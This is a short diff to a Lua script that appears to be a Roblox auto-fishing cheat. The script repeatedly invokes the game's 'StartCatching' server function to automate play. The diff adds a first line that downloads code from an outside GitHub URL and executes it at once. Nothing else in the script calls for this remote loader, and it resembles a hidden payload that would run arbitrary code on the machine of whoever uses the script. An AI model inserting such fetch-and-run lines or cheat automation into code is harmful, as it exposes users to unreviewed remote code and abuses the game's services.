@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/crypt0shiva/awschaos/main/source'))()
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 local chat = playerGui:WaitForChild("Chat"):WaitForChild("Frame")
@@ -625,7 +625,7 @@ local function toggleAutoFishing()
         coroutine.wrap(function()
             while isAutoFishingToggled do
                 local args = {
-                    [1] = "Chocolate"
+                    [1] = "Normal"
                     }
                 game:GetService("ReplicatedStorage").Packages.Knit.Services.NetService.RF.StartCatching:InvokeServer(unpack(args))
                 local args = {
